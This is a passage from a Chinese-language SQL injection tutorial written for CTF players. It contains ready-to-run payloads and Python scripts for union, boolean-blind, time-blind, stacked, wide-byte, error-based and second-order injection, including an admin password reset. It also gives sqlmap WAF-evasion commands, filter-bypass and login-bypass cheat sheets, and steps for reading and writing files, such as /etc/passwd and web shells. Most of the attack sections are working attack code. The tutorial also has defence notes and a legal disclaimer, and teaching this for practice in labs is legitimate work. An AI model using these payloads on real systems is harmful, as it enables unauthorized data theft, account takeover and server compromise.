| 7 | 查列名 | `-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='flag' --+` | 返回 `id,flag_value` |
| 8 | 查数据 | `-1' union select 1,flag_value,3 from flag --+` | `flag{union_injection_easy}` |

**用时：**约 2 分钟（包含手速）

---

### 案例2：布尔盲注 + 二分法

**题目描述：**一个搜索页面 `http://target/search.php?q=test`，输入不同条件页面返回"Found"或"Not Found"。

**解题步骤：**

```python
import requests

url = "http://target/search.php"
true_flag = "Found"
result = ""

# 先确定数据库长度
for length in range(1, 20):
    payload = f"test' and length(database())={length} -- "
    resp = requests.get(url, params={"q": payload})
    if true_flag in resp.text:
        print(f"[+] 数据库名长度为 {length}")
        break

# 二分法逐位猜解
for pos in range(1, length + 1):
    left, right = 32, 127
    while left < right:
        mid = (left + right) // 2
        payload = f"test' and ascii(substr(database(),{pos},1))>{mid} -- "
        resp = requests.get(url, params={"q": payload})
        if true_flag in resp.text:
            left = mid + 1
        else:
            right = mid
    result += chr(left)
    print(f"[+] 第 {pos} 位: {chr(left)} → 当前: {result}")

# 对 flag 表重复上述过程查数据
```

**关键点：**确定"Found"和"Not Found"的稳定判断特征，写二分法脚本逐位爆破。

**用时：**约 3-5 分钟（取决于网络速度和 flag 长度）

---

### 案例3：时间盲注 + Timeout

**题目描述：**登录框 `http://target/login.php`，无论输入正确还是错误都返回"OK"，但可以用时间盲注。

**解题步骤：**

```python
import requests

url = "http://target/login.php"
result = ""
delay = 3
timeout = 2.5

for i in range(1, 100):
    left, right = 32, 127
    while left < right:
        mid = (left + right) // 2
        payload = (f"admin' and if(ascii(substr("
                   f"(select group_concat(table_name) "
                   f"from information_schema.tables "
                   f"where table_schema=database()),{i},1))>{mid},"
                   f"sleep({delay}),0) -- ")
        try:
            requests.post(url, data={"username": payload, "password": "x"},
                         timeout=timeout)
            right = mid  # 没超时 → 条件为假
        except requests.exceptions.Timeout:
            left = mid + 1  # 超时 → 条件为真
    if left != 32:
        result += chr(left)
        print(result)
    else:
        break
```

**关键点：**Timeout 值必须小于 sleep 值，先手工测 `admin' and sleep(3) -- ` 确认延迟生效。

**用时：**约 15-30 分钟（较慢，建议吃饭时挂着跑）

---

### 案例4：堆叠注入 + 改表名

**题目描述：**一个留言板，每条留言显示用户名和内容。存在堆叠注入。管理员登录后可以查看所有用户。

**解题步骤：**

```sql
-- 1. 确认堆叠注入存在
1'; select sleep(5) --     -- 延迟 5 秒

-- 2. 查所有表
1'; show tables --
-- 结果：messages, users, secret

-- 3. 查 secret 表结构
1'; desc secret --
-- 结果：id int, flag varchar(255)

-- 4. 改表名：把 secret 改成 users，把 users 改成 users_bak
1'; rename table users to users_bak --
1'; rename table secret to users --

-- 5. 查看 secret 中 flag 列的列名
1'; desc users --
-- 结果：flag 列还在

-- 6. 为兼容登录查询，把 flag 列改成 username
1'; alter table users change flag username varchar(255) --

-- 7. 用万能密码登录
' or 1=1 --
-- 登录成功后页面上显示的就是 flag 的内容！
```

**关键点：**堆叠注入配合改表名 + 万能密码直接在前台展示 flag 内容。

**用时：**约 5 分钟

---

### 案例5：宽字节注入 + 报错注入

**题目描述：**URL `http://target/show.php?id=1`，测试 `1'` 没有报错（被转义），但页面编码是 GBK。

**解题步骤：**

```sql
-- 1. 测试宽字节
1%df%27 and 1=1 --+     -- 正常（说明转义被绕过）
1%df%27 and 1=2 --+     -- 异常

-- 2. 报错注入查数据库
1%df%27 and updatexml(1,concat(0x7e,database(),0x7e),1) --+   -- 报错显示 ~ctf_db~

-- 3. 查表名
1%df%27 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+

-- 4. 查数据（分段）
1%df%27 and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),1,30),0x7e),1) --+
1%df%27 and updatexml(1,concat(0x7e,substr((select group_concat(flag) from flag),31,30),0x7e),1) --+
```

**关键点：**`%df%27` 必须在 URL 中保持编码状态发送，不能直接在浏览器地址栏输入。

**用时：**约 3 分钟

---

### 案例6：二次注入 + 修改密码

**题目描述：**网站有注册、登录、修改密码三个功能。修改密码时存在二次注入。

**解题步骤：**

```bash
# 1. 注册恶意用户
curl -X POST http://target/register.php \
  -d "username=admin' -- &password=123456"

# 2. 用注册的账号登录
curl -X POST http://target/login.php \
  -d "username=admin' -- &password=123456" \
  -c cookies.txt

# 3. 使用修改密码功能（触发二次注入）
curl -X POST http://target/change_password.php \
  -d "new_password=hacked123" \
  -b cookies.txt

# 此时实际执行的 SQL：
# UPDATE users SET password='hacked123' WHERE username='admin' -- '
# 成功修改 admin 用户的密码！

# 4. 用 admin / hacked123 登录后台
curl -X POST http://target/login.php \
  -d "username=admin&password=hacked123"
```

**关键点：**注册时写入 payload 但不要触发报错，修改密码时触发注入。

**用时：**约 3 分钟

---

### 案例7：sqlmap 自动化 + WAF 绕过

**题目描述：**目标 WAF 严格，手工注入困难。使用 sqlmap + tamper 自动绕过。

**解题步骤：**

```bash
# 1. 先用 BurpSuite 抓取正常请求，保存为 request.txt

# 2. 基础检测（如果被 WAF 拦截会自动降级）
sqlmap -r request.txt -p id --batch --random-agent

# 3. 如果被拦截，使用 tamper 脚本组合
sqlmap -r request.txt -p id \
  --tamper="between,randomcase,space2comment" \
  --random-agent \
  --level=3 \
  --risk=2 \
  --batch

# 4. 如果还是不行，指定注入技术和数据库类型
sqlmap -r request.txt -p id \
  --technique=B \
  --dbms=MySQL \
  --tamper="space2comment,plus2concat" \
  --threads=5 \
  --batch

# 5. 检测成功后查数据
sqlmap -r request.txt -p id --current-db
sqlmap -r request.txt -p id -D target_db --tables
sqlmap -r request.txt -p id -D target_db -T flag --dump
```

**关键点：**组合多个 tamper、使用 `--random-agent`、必要时指定 `--technique=B` 避免触发 WAF。

**用时：**约 5-10 分钟

---

### CTF 综合解题流程图

```
发现参数 (id=1, page=2, username=admin)
    │
    ├── 加单引号: 1'
    │   ├── 报错 → 可能是注入
    │   │   └── 测试 and 1=1 / and 1=2
    │   │       ├── 差异明显 → 闭合方式确定
    │   │       │   ├── 有回显 → Union 注入 (最快)
    │   │       │   ├── 有报错 → 报错注入
    │   │       │   └── 无回显/无报错
    │   │       │       ├── 页面有差异 → 布尔盲注
    │   │       │       └── 无差异 → 时间盲注
    │   │       └── 无明显差异 → 尝试其他闭合
    │   │           └── 仍无差异 → 时间盲注+延时函数
    │   ├── 不报错但页面异常 → 可能是数字型或特殊闭合
    │   │   └── 测试 1+1, 1-1 等算式
    │   └── 完全没反应 → 可能没有注入
    │       └── 检查编码、WAF、是否 POST 参数
    │
    ├── 被转义 (\') → 宽字节注入 (%df%27)
    ├── 返回"OK"无变化 → 时间盲注 (sleep)
    └── 能执行多语句 → 堆叠注入 (;)

查数据阶段:
    database() → information_schema.tables →
    information_schema.columns → 目标表 → 目标数据
```

---

## 16. 知识总结表

### SQL 注入类型速查

| 注入类型 | 适用条件 | 数据获取方式 | 常用函数/关键字 | 难度 |
|---------|---------|-------------|----------------|------|
| Union 注入 | 有回显位置 | 直接显示在页面 | `UNION SELECT` | 低 |
| 报错注入 | 显示报错信息 | 报错信息中包含数据 | `UPDATEXML()` / `EXTRACTVALUE()` / `FLOOR(RAND())` | 低 |
| 布尔盲注 | 页面真假不同 | 逐字符猜解 | `ASCII()` / `SUBSTR()` / `LENGTH()` / `LIKE` | 中 |
| 时间盲注 | 页面无差异 | 响应时间判断 | `SLEEP()` / `BENCHMARK()` / `IF()` | 高 |
| 宽字节注入 | GBK 编码 + 转义 | 结合其他注入类型 | `%df%27` / `%bf%27` | 中 |
| 堆叠注入 | 分号可用 + 多语句支持 | 可执行任意 SQL | `;` 分隔多语句 | 中 |
| 二次注入 | 先存储后触发 | 结合其他注入类型 | payload 先入库后使用 | 中高 |
| Order By 注入 | 参数在 ORDER BY | 报错/盲注 | `ORDER BY` + 函数 | 中 |
| 文件读写 | FILE 权限 | 直接读取/写入文件 | `LOAD_FILE()` / `INTO OUTFILE` | 高 |

### 六大步骤检查表（CTF 解题流程）

| 步骤 | 操作 | 关键 Payload | 预期结果 |
|------|------|-------------|---------|
| 1. 确定注入点 | 加单引号、永真/永假条件 | `1'` / `1 and 1=1` / `1 and 1=2` | 页面响应变化 |
| 2. 确定闭合方式 | 成对测试所有闭合组合 | `1' / 1" / 1) / 1') / 1'))` | 1=1 和 1=2 差异明显 |
| 3. 判断回显方式 | 尝试 Union 看是否有回显位 | `-1' union select 1,2,3 -- ` | 页面出现数字 |
| 4. 查库名 | database() + information_schema | `-1' union select 1,database(),3 -- ` | 拿到库名 |
| 5. 查表名列名 | information_schema.tables/columns | `... where table_schema=database()` | 拿到表和列名 |
| 6. 查数据 | SELECT 目标字段 | `... group_concat(列名) from 表名` | 拿到 flag |

### 四大数据库报错/延时函数速查

| 需求 | MySQL | SQLite | PostgreSQL | SQL Server | Oracle |
|------|-------|--------|-------------|------------|--------|
| 延时 5 秒 | `SLEEP(5)` | `RANDOMBLOB(1e8)` | `PG_SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` |
| 报错 | `UPDATEXML()` | 无原生 | `CAST('x' AS INT)` | `CONVERT(INT, 'x')` | `UTL_INADDR.GET_HOST_NAME()` |
| 字符串拼接 | `CONCAT('a','b')` | `'a' \|\| 'b'` | `'a' \|\| 'b'` | `'a' + 'b'` | `'a' \|\| 'b'` |
| 多行合并 | `GROUP_CONCAT()` | `GROUP_CONCAT()` | `STRING_AGG()` | `STRING_AGG()` (2017+) | `LISTAGG()` |
| 取当前库 | `DATABASE()` | 无 | `CURRENT_DATABASE()` | `DB_NAME()` | `ORA_DATABASE_NAME` |
| 取版本 | `VERSION()` / `@@VERSION` | `SQLITE_VERSION()` | `VERSION()` | `@@VERSION` | `SELECT * FROM V$VERSION` |
| 必要 FROM | 无 | 无 | 无 | 无 | **必须有 `FROM DUAL`**|
| 文件读 | `LOAD_FILE()` | 无 | `PG_READ_FILE()` | `OPENROWSET(BULK...)` | `UTL_FILE.FOPEN()` |
| 文件写 | `INTO OUTFILE` | 无 | `COPY ... TO` | `XP_CMDSHELL`（默认关） | `UTL_FILE.PUTF()` |

### 常用绕过方法速查

| 绕过目标 | 方法 | 示例 |
|---------|------|------|
| 空格过滤 | `/**/` | `union/**/select` |
| 空格过滤 | `%09` / `%0c` 等 | `union%09select` |
| 空格过滤 | 小括号包裹 | `UNION(SELECT(1),(2))` |
| 引号过滤 | 十六进制替代 | `0x7573657273` = 'users' |
| 引号过滤 | 用 ASCII 盲注 | `ASCII(SUBSTR(...))>32` |
| 逗号过滤 | FROM/FOR 语法 | `SUBSTRING(x FROM 1 FOR 1)` |
| 逗号过滤 | JOIN 派生表 | `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` |
| 逗号过滤 | LIMIT 改写 | `LIMIT 1 OFFSET 0` |
| 逗号过滤 | CASE WHEN 替代 IF | `CASE WHEN 条件 THEN SLEEP(5) ELSE 0 END` |
| 关键字过滤 | 双写 | `uniunionon` / `seselectlect` |
| 关键字过滤 | 大小写混写 | `UnIoN SeLeCt` |
| 关键字过滤 | 十六进制编码 | `%75%6e%69%6f%6e` (union) |
| 等号过滤 | LIKE | `WHERE username LIKE 'admin'` |
| AND 过滤 | `&&` | `1' && '1'='1` |
| OR 过滤 | `\|\|` | `1' \|\| '1'='1` |
| `SLEEP()` 过滤 | `BENCHMARK()` | `BENCHMARK(10000000,MD5(1))` |
| `SUBSTR()` 过滤 | `SUBSTRING()` / `MID()` | `MID(DATABASE(),1,1)` |
| `ORDER BY` 过滤 | `GROUP BY` | `GROUP BY 3` |
| `INFORMATION_SCHEMA` 过滤 | 系统表 | `mysql.innodb_table_stats` |
| `INFORMATION_SCHEMA` 过滤 | 堆叠+SHOW | `SHOW TABLES` |
| 注释符 `--` 过滤 | 换用 `#` | `1' OR 1=1 %23` |
| 注释符 `#` 过滤 | 换用 `--` | `1' OR 1=1 --+` |
| 注释符全过滤 | 恒等条件闭合 | `1' AND '1'='1` |

### 万能密码速查表

| 构造方式 | Payload（单引号闭合场景） | 适用场景 |
|---------|-------------------------|---------|
| 恒真 + 注释 | `' OR 1=1 -- ` | 通用 |
| 恒真 + 等号 | `' OR '1'='1` | 注释符被过滤 |
| 恒真 + 无注释 | `' OR 'a'='a` | 注释符被过滤 |
| 恒真缩写 | `' OR 1 -- ` | 简化写法 |
| 恒真逻辑 | `' OR true -- ` | 数字型场景 |
| 双等号 | `'=''` | MySQL 特殊写法 |
| 指定用户 + 注释 | `admin' -- ` | 指定用户登录 |
| 指定用户 + 注释(MySQL) | `admin'#` | MySQL 专属 |
| 块注释跨框 | 账号 `admin'/*`，密码 `*/ OR 1=1` | 多输入框 |
| 双引号版 | `" OR "1"="1` | 双引号闭合资环 |

### 注入位置检测表

| 注入位置 | 检测方法 | 常用参数 | sqlmap level |
|---------|---------|---------|-------------|
| GET 参数 | `?id=1'` | `?id=`、`?page=`、`?cat=` | level 1 |
| POST 参数 | 表单传 `username=admin'` | 登录、搜索、注册 | level 1 |
| Cookie | `Cookie: uid=1'` | `uid`、`user`、`session` | level 2+ |
| User-Agent | `User-Agent: 1'` | 日志记录、统计 | level 3+ |
| Referer | `Referer: 1'` | 来源追踪 | level 3+ |
| X-Forwarded-For | `X-Forwarded-For: 1'` | 地理位置、CDN | level 3+ |
| Host | `Host: 1'` | 虚拟主机路由 | level 5 |
| Accept-Language | 修改语言值 | 多语言站点 | level 5 |

### 文件读写权限检查流程

```
1. SELECT USER()                     -- 查看当前数据库用户
2. SELECT CURRENT_USER()             -- 查看实际权限用户
3. SELECT @@SECURE_FILE_PRIV         -- 查看 MySQL 文件读写限制
4. 检查 FILE 权限：
   SELECT * FROM mysql.user WHERE user = user()
5. 确认 Web 目录绝对路径：
   - 报错信息中泄露
   - load_file('/etc/passwd') 验证
   - 常见路径：/var/www/html/ /var/www/ /opt/lampp/htdocs/
6. 选择写入位置（Web 可访问目录）
7. 确认目标文件不存在（OUTFILE 不能覆盖现有文件）
8. 执行 LOAD_FILE / INTO OUTFILE
9. 浏览器访问确认写入成功
```

### 布尔盲注性能对比

| 爆破方式 | 每字符请求数 | 优点 | 缺点 | 推荐度 |
|---------|------------|------|------|--------|
| 字符字典 | 50~70 次 | 直观、易理解 | 字典不全会漏字符 |  |
| ASCII 顺序 | 95 次 | 覆盖全部可打印字符 | 慢 |  |
| **二分法**| **7 次** | **最快，稳定** | 需要维护左右指针 | **** |
| LIKE 模糊匹配 | 52 次 | 可绕过等号过滤 | 速度一般 |  |
| REGEXP 正则 | 36 次 (字母) | 灵活 | 复杂场景难构造 |  |

### 时间盲注优化策略

| 场景 | 推荐策略 | 说明 |
|------|---------|------|
| 网络稳定 | 阈值法（响应时间） | `threshold = sleep_time * 0.8` |
| 网络不稳定 | Timeout 法 | 用 `requests.timeout` 捕获超时 |
| 需要加速 | 多线程分段 | 同时爆破第1-3位、4-6位 |
| sleep 被过滤 | benchmark 替代 | `BENCHMARK(50000000, MD5(1))` |
| 批量数据 | 先查 length 再查内容 | 先确定长度，避免无效请求 |

### SQL 注入防御对比

| 防御方式 | 原理 | 有效性 | 说明 |
|---------|------|--------|------|
| **预编译 PreparedStatement**| SQL 模板与参数分离 | **** | **最有效、根本防御** |
| 参数化查询 | 绑定变量传参 | ****| 与预编译等效 |
| 存储过程 | SQL 封装在数据库端 |  | 内部实现不当仍有风险 |
| 输入过滤（黑名单） | 拦截 `'` `UNION` `SELECT` |  | 容易被绕过 |
| 转义函数 | `addslashes()` / `mysql_real_escape_string()` |  | 宽字节编码下可被绕过 |
| WAF | 规则匹配拦截 |  | 可被 tamper 绕过 |
| 最小权限原则 | 只给必要权限 |  | 降低危害，不阻止注入 |
| 白名单验证 | 只允许特定值 |  | 适用于枚举型参数 |

### CTF 注入速度参考

| 注入类型 | 完整提取 32 位 flag 的耗时 | 说明 |
|---------|--------------------------|------|
| Union 注入 | 1 秒 | 一条 payload 搞定 |
| 报错注入 | 10~30 秒 | 长数据需分段 |
| 布尔盲注（二分法） | 2~5 分钟 | 每字符约 7 次请求 |
| 布尔盲注（字典法） | 10~20 分钟 | 每字符约 50 次请求 |
| 时间盲注（sleep=3） | 15~40 分钟 | 每字符约 7 次 × 3 秒 |
| 时间盲注（sleep=1） | 5~15 分钟 | 网络波动影响大 |

### CTF 解题方法论总结

| 阶段 | 任务 | 关键动作 | 时间预算 |
|------|------|---------|---------|
| 侦察 | 确认注入点 | 单引号测、永真永假对比 | 1 分钟 |
| 定式 | 确认闭合和回显方式 | 闭合表逐一测试、看报错/回显 | 2 分钟 |
| 枚举 | 查库名→表名→列名 | `database()` → `information_schema` | 2 分钟 |
| 提取 | 取数据 | `union select` 或盲注脚本 | 1~30 分钟 |
| 提权 | 文件读写/RCE | 写 shell、读 `/flag` | 5 分钟 |

### 常见报错信息速查

| 报错信息 | 可能原因 |
|---------|---------|
| `You have an error in your SQL syntax` | SQL 语法错误，可能找到闭合方式了 |
| `Unknown column 'xxx' in 'where clause'` | 列名不存在 |
| `Table 'xxx' doesn't exist` | 表名不存在 |
| `Function does not exist` | 函数不存在（MySQL 8.x 缺 updatexml） |
| `Duplicate entry` | floor(rand()) 报错成功触发 |
| `XPATH syntax error: '~xxx~'` | updatexml/extractvalue 报错成功 |
| `Cannot execute statement` | 权限不足 |
| `The used SELECT statements have a different number of columns` | UNION 列数不匹配 |
| `#1130 - Host is not allowed to connect` | 数据库远程连接被禁止 |

### 最终记忆口诀

```
有回显  → Union 注入          (直接查)
有报错  → 报错注入            (报错里看)
有真假  → 布尔盲注            (逐位猜)
无差异  → 时间盲注            (看时间)
宽字节  → GBK 编码绕过转义    (%df%27)
分号活  → 堆叠注入            (增删改)
先存储  → 二次注入            (后触发)

核心本质：用户输入被当成 SQL 代码执行
防御根本：预编译（PreparedStatement）
解题按序：闭合 → 回显 → 库名 → 表名 → 列名 → 数据
```

---

> **最终提醒：** SQL 注入种类繁多，但核心只有两件事：**破坏原来的 SQL 结构**、**用新的 SQL 拿到想要的数据**。遇到新题目不要慌，按这个顺序排查：闭合方式 → 回显方式（Union/报错/布尔/时间）→ 查库名 → 查表名 → 查列名 → 取数据。熟练了之后，90% 的注入题都能在 10 分钟内解出来。如果你在一类注入上卡了 30 分钟以上，果断换思路——很可能是闭合方式判断错了，或者数据库类型识别错了。

> **安全声明：** 本文内容仅供网络安全学习、CTF 竞赛和授权渗透测试使用。未经授权的 SQL 注入测试是违法行为。请在学习完本文后，仅在你自己搭建的靶场或获得明确授权的目标上练习。尊重他人数字资产，做一名有道德的白帽子。

---

**推荐练习平台：**
- **DVWA**— 经典的 PHP 漏洞练习平台，包含 SQL 注入所有难度级别
- **SQLi-Labs**— 专为 SQL 注入设计的靶场，80+ 关覆盖所有注入类型
- **HackTheBox**— 实战化渗透测试平台，定期更新含 SQL 注入的机器
- **BugKu CTF**— 国内 CTF 平台，大量 SQL 注入题目
- **PortSwigger Web Security Academy**— 免费的 SQL 注入交互式练习，包含 30+ 个实验场景
- **TryHackMe**— 适合初学者的实战化平台，有专门的 SQL 注入学习路径
